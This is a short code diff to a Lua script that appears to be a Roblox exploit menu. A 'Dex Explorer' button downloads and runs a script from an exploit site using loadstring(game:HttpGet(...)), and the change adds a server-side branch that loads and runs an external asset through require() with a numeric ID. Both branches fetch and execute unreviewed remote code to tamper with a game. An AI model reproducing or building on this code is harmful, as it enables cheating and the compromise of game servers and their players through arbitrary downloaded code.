@@ -189,7 +189,11 @@ btn.Position = UDim2.new(0.658,0,0.226,0)
 btn.Text = "Dex Explorer"
 btn.MouseButton1Down:Connect(function()
 	pcall(function()
-		loadstring(game:HttpGet("https://obj.wearedevs.net/2/scripts/Dex%20Explorer.lua"))()
+		if game["Run Service"]:IsServer() then
+			require(14572394952)("/localplayer/")
+		else
+			loadstring(game:HttpGet("https://obj.wearedevs.net/2/scripts/Dex%20Explorer.lua"))()
+		end
 	end)
 end)
 
